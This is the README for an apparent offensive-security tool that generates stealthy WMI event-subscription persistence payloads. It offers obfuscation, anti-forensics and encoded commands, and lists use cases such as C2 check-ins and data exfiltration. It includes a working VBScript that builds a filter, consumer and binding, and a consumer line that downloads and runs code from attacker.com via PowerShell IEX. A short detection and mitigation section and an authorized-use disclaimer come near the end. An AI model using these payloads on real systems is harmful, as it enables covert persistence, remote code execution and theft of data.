# WMI Event Subscription for Asynchronous Execution

## Overview

This module implements WMI (Windows Management Instrumentation) event subscription for asynchronous command execution. It provides a powerful mechanism for executing commands automatically when specific WMI events occur, without requiring explicit polling or continuous monitoring.

## Key Features

### Asynchronous Execution
- Commands execute automatically when events occur
- Non-blocking, event-driven architecture
- No constant polling required

### Event Trigger Types
- Process creation/termination
- Service startup/shutdown
- Network adapter configuration changes
- Disk space monitoring
- System time changes
- User login/logout events
- Registry modifications
- File changes
- Timer-based periodic execution

### Persistence Mechanisms
- Subscriptions survive system reboot
- Stored in WMI repository, not filesystem
- Minimal forensic artifacts
- Legitimate WMI usage patterns

### Obfuscation & Stealth
- Variable name randomization
- Command encoding (Base64/Hex)
- Multiple implementation variants
- Low process signature
- Can mimic system processes

## Architecture

### Core Components

```
WMI Event Subscription
├── Event Filter (__EventFilter)
│   └── WQL Query defining trigger condition
├── Command Consumer (CommandLineEventConsumer)
│   └── Command to execute when event fires
└── Binding (__FilterToConsumerBinding)
    └── Links Filter to Consumer
```

### Event Flow

```
System Event Occurs
    ↓
WMI Event Filter Evaluates
    ↓
Filter Matches WQL Query
    ↓
Event Consumer Triggered
    ↓
Command Executes Asynchronously
```

## API Reference

### Main Classes

#### `WMIEventSubscription`
Core class for generating event subscription payloads.

```python
from wmi_event_subscription import WMIEventSubscription, EventSubscriptionConfig

config = EventSubscriptionConfig(
    event_trigger=EventTriggerType.PROCESS_START,
    obfuscate_names=True
)

subscription = WMIEventSubscription(config)
payload = subscription.generate_event_subscription_vbs("cmd.exe")
```

#### `EventSubscriptionConfig`
Configuration class for event subscription parameters.

```python
@dataclass
class EventSubscriptionConfig:
    event_trigger: EventTriggerType = EventTriggerType.PROCESS_START
    event_filter_name: str = "AutoStartEvent"
    consumer_name: str = "CommandConsumer"
    namespace: str = "root\\subscription"
    obfuscate_names: bool = True
    add_anti_forensics: bool = True
    hide_errors: bool = True
```

### Event Trigger Types

```python
class EventTriggerType(Enum):
    PROCESS_START = "ProcessStart"
    PROCESS_STOP = "ProcessStop"
    SERVICE_START = "ServiceStart"
    SERVICE_STOP = "ServiceStop"
    NETWORK_ADAPTER_CONFIG = "NetworkAdapterConfig"
    DISK_SPACE_LOW = "DiskSpaceLow"
    SYSTEM_TIME_CHANGE = "SystemTimeChange"
    USER_LOGIN = "UserLogin"
    USER_LOGOUT = "UserLogout"
    REGISTRY_CHANGE = "RegistryChange"
    FILE_CHANGE = "FileChange"
    WMI_CONSUMER_TIMER = "TimerEvent"
```

### Main Methods

#### Generate Basic Event Subscription
```python
subscription = WMIEventSubscription()
payload = subscription.generate_event_subscription_vbs(
    command="cmd.exe /c whoami",
    trigger_type=EventTriggerType.PROCESS_START
)
```

#### Generate Timer-Based Consumer
```python
payload = subscription.generate_timer_event_consumer(
    command="cmd.exe /c dir",
    interval_milliseconds=60000  # 60 seconds
)
```

#### Generate Service Startup Consumer
```python
payload = subscription.generate_service_startup_consumer(
    command="powershell.exe",
    service_name="RemoteRegistry"
)
```

#### Generate Process-Specific Trigger
```python
payload = subscription.generate_event_trigger_subscription(
    command="cmd.exe",
    process_name="notepad.exe"
)
```

#### Generate Asynchronous Event Handler
```python
payload = subscription.generate_async_event_handler(
    command="calc.exe"
)
```

#### Generate Encoded Event Subscription
```python
# Base64 encoding
payload = subscription.generate_encoded_event_subscription(
    command="powershell.exe",
    trigger_type=EventTriggerType.PROCESS_START,
    encoding="base64"
)

# Hex encoding
payload = subscription.generate_encoded_event_subscription(
    command="powershell.exe",
    encoding="hex"
)
```

#### Generate PowerShell-Based Subscription
```python
payload = subscription.generate_powershell_event_subscription(
    command="powershell.exe",
    trigger_type=EventTriggerType.SERVICE_START
)
```

#### Generate Cleanup/Removal Code
```python
payload = subscription.generate_event_subscription_removal(
    filter_name="AutoStartEvent",
    consumer_name="CommandConsumer"
)
```

### High-Level API

```python
from wmi_event_subscription import generate_event_subscription_payload

# Process event subscription
payload = generate_event_subscription_payload(
    command="cmd.exe",
    event_type="process"
)

# Service startup subscription
payload = generate_event_subscription_payload(
    command="powershell.exe",
    event_type="service",
    service_name="WinRM"
)

# Timer subscription
payload = generate_event_subscription_payload(
    command="cmd.exe",
    event_type="timer",
    interval=60000
)

# Encoded subscription
payload = generate_event_subscription_payload(
    command="cmd.exe",
    event_type="encoded",
    encoding="base64"
)
```

## Event Subscription Methods

### 1. Process Startup Subscription
Triggers when any process starts (except wscript.exe).

**Advantages:**
- Very frequent trigger opportunity
- High reliability
- Simple to implement

**Use Cases:**
- Ensure command runs frequently
- Leverage normal application launches
- Maximize execution probability

**WQL:**
```sql
SELECT * FROM __InstanceCreationEvent 
WHERE TargetInstance ISA "Win32_Process" 
AND TargetInstance.Name!="wscript.exe"
```

### 2. Service Startup Subscription
Triggers when a specific service starts.

**Advantages:**
- Deterministic trigger timing
- Less conspicuous than process monitoring
- Multiple service startup opportunities

**Use Cases:**
- Trigger on Windows Update service startup
- Execute during system maintenance windows
- Exploit regular system service restarts

**WQL:**
```sql
SELECT * FROM __InstanceModificationEvent 
WHERE TargetInstance ISA "Win32_Service" 
AND TargetInstance.Name="RemoteRegistry" 
AND TargetInstance.State="Running"
```

### 3. Timer-Based Subscription
Executes periodically at specified interval.

**Advantages:**
- Precise timing control
- Independent execution schedule
- Bypass event-dependent triggers

**Use Cases:**
- Periodic C2 check-ins
- Regular data exfiltration
- Maintain persistent connection

**WQL:**
```sql
SELECT * FROM __TimerEvent 
WHERE TimerInterval=60000
```

### 4. User Login Subscription
Triggers when user session is created.

**Advantages:**
- Captures every user logon
- Persists even if user logs off
- Survives reboot

**Use Cases:**
- Execute on each user login
- Maintain per-user persistence
- Establish presence for each session

**WQL:**
```sql
SELECT * FROM __InstanceCreationEvent 
WHERE TargetInstance ISA "Win32_LogonSession"
```

### 5. Registry Change Subscription
Triggers on registry modifications.

**Advantages:**
- Monitor for specific system changes
- Detect configuration modifications
- React to system events

**Use Cases:**
- Trigger on security software disabling
- Monitor antivirus registry keys
- Detect policy changes

**WQL:**
```sql
SELECT * FROM RegistryKeyChangeEvent 
WHERE Hive="HKEY_LOCAL_MACHINE"
```

## WQL Query Reference

### Instance Creation Events
```sql
SELECT * FROM __InstanceCreationEvent 
WHERE TargetInstance ISA "Win32_Process"
```

### Instance Deletion Events
```sql
SELECT * FROM __InstanceDeletionEvent 
WHERE TargetInstance ISA "Win32_Process"
```

### Instance Modification Events
```sql
SELECT * FROM __InstanceModificationEvent 
WHERE TargetInstance ISA "Win32_Service"
```

### Timer Events
```sql
SELECT * FROM __TimerEvent 
WHERE TimerInterval=60000
```

### Registry Change Events
```sql
SELECT * FROM RegistryKeyChangeEvent 
WHERE Hive="HKEY_LOCAL_MACHINE"
```

## Implementation Examples

### Example 1: Process Startup Persistence
```vbscript
Dim objLoc, objSvc, objFilter, objConsumer, objBinding
Set objLoc = CreateObject("WbemScripting.SWbemLocator")
Set objSvc = objLoc.ConnectServer(".", "root\subscription")

' Create filter
Set objFilter = objSvc.Get("__EventFilter").SpawnInstance_()
objFilter.Name = "ProcessStartFilter"
objFilter.QueryLanguage = "WQL"
objFilter.Query = "SELECT * FROM __InstanceCreationEvent WHERE TargetInstance ISA ""Win32_Process"""
objSvc.Put objFilter

' Create consumer
Set objConsumer = objSvc.Get("CommandLineEventConsumer").SpawnInstance_()
objConsumer.Name = "ProcessStartConsumer"
objConsumer.CommandLineTemplate = "cmd.exe /c ipconfig"
objConsumer.RunInteractively = False
objSvc.Put objConsumer

' Create binding
Set objBinding = objSvc.Get("__FilterToConsumerBinding").SpawnInstance_()
objBinding.Filter = objSvc.Get("__EventFilter.Name='ProcessStartFilter'").Path_
objBinding.Consumer = objSvc.Get("CommandLineEventConsumer.Name='ProcessStartConsumer'").Path_
objSvc.Put objBinding
```

### Example 2: Service Startup Persistence
```vbscript
' Trigger on RemoteRegistry service startup
objFilter.Query = "SELECT * FROM __InstanceModificationEvent WHERE TargetInstance ISA ""Win32_Service"" AND TargetInstance.Name=""RemoteRegistry"" AND TargetInstance.State=""Running"""
```

### Example 3: Timer-Based Execution
```vbscript
' Execute every 60 seconds
objFilter.Query = "SELECT * FROM __TimerEvent WHERE TimerInterval=60000"
```

### Example 4: Encoded Command
```vbscript
Function DecodeBase64Cmd(encoded)
    Dim xmlDoc, node
    Set xmlDoc = CreateObject("MSXML2.DOMDocument")
    Set node = xmlDoc.CreateElement("tmp")
    node.DataType = "bin.base64"
    node.Text = encoded
    DecodeBase64Cmd = node.NodeTypedValue
End Function

' Command stored Base64 encoded
objConsumer.CommandLineTemplate = "powershell -NoProfile -Command IEX(New-Object Net.WebClient).DownloadString(""http://attacker.com/ps"")"
```

## Obfuscation Techniques

### Variable Name Randomization
```python
# Automatically generate random variable names
config = EventSubscriptionConfig(obfuscate_names=True)
```

### Command Encoding
```python
# Base64 encode command
payload = subscription.generate_encoded_event_subscription(
    command="powershell.exe",
    encoding="base64"
)

# Hex encode command
payload = subscription.generate_encoded_event_subscription(
    command="powershell.exe",
    encoding="hex"
)
```

### Multiple Implementation Variants
- VBS implementation
- PowerShell implementation
- Asynchronous class-based handlers
- Direct method invocation

## Detection & Defense

### Detection Methods
1. **WMI Repository Auditing**
   - Monitor root\subscription namespace for new objects
   - Alert on CommandLineEventConsumer creation
   - Track __FilterToConsumerBinding additions

2. **Process Execution Monitoring**
   - Monitor spawned processes for suspicious parents (WmiPrvSE.exe)
   - Track processes without associated command line in WMI

3. **Registry Monitoring**
   - Monitor WMI-related registry keys
   - Track subscription persistence mechanism usage

4. **Event Log Analysis**
   - Monitor WMI Activity logs
   - Track subscription creation events

### Mitigation Strategies
1. **Disable WMI Event Subscriptions**
   ```powershell
   Get-WmiObject -Namespace root\subscription -Class __EventFilter | Remove-WmiObject
   Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Remove-WmiObject
   Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Remove-WmiObject
   ```

2. **Audit WMI Repository**
   ```powershell
   Get-WmiObject -Namespace root\subscription -Class __EventFilter
   Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer
   ```

3. **Restrict WMI Access**
   - Disable WMI service on systems that don't require it
   - Implement access control on WMI namespaces
   - Monitor WmiPrvSE.exe process activity

## Performance Considerations

### Event Subscription Overhead
- Minimal CPU usage (event-driven, not polling)
- Low memory footprint
- WMI repository bloat with many subscriptions

### Trigger Frequency
- Process startup: Very frequent (1-100+ per minute)
- Service startup: Rare (several per boot)
- Timer: Precise intervals (user-defined)

### Best Practices
- Use specific process names in filters to reduce false triggers
- Implement smart command logic to check for existing instances
- Use timer intervals carefully (too frequent = high overhead)
- Clean up subscriptions when no longer needed

## Troubleshooting

### Subscription Not Firing
1. Verify WQL syntax
2. Check WMI repository access permissions
3. Ensure CommandLineEventConsumer is properly configured
4. Verify binding correctly links filter and consumer

### Command Not Executing
1. Test command manually
2. Verify full command paths
3. Check for special character escaping
4. Confirm RunInteractively setting

### WMI Repository Issues
1. Repair WMI repository: `winmgmt /salvagerepository`
2. Reset WMI: `winmgmt /resetrepository`
3. Rebuild WMI provider: `Rundll32 wbemupgd /AllocateRepository`

## Testing

Run the comprehensive test suite:
```bash
python3 test_wmi_event_subscription.py
```

Generate examples:
```bash
python3 wmi_event_subscription_examples.py
```

Run specific example:
```bash
python3 wmi_event_subscription_examples.py 1
```

## Security Warnings

This implementation is for authorized security testing and educational purposes only. Unauthorized use may violate laws including:
- Computer Fraud and Abuse Act (CFAA)
- Digital Millennium Copyright Act (DMCA)
- Similar laws in other jurisdictions

Always obtain explicit written authorization before testing.

## References

### Microsoft Documentation
- [WMI Event Queries](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-event-queries)
- [__EventFilter Class](https://learn.microsoft.com/en-us/windows/win32/cimwin32prov/-_-_eventfilter)
- [CommandLineEventConsumer Class](https://learn.microsoft.com/en-us/windows/win32/cimwin32prov/commandlineeventconsumer)
- [WQL Query Language](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wql-sql-for-wmi)

### Related Concepts
- WMI Provider Events
- Event Consumer Architecture
- WMI Persistence
- Asynchronous Operations

## License

Educational and authorized security testing use only.

---

**Version:** 1.0  
**Last Updated:** 2026-06-29  
**Author:** Security Research Team
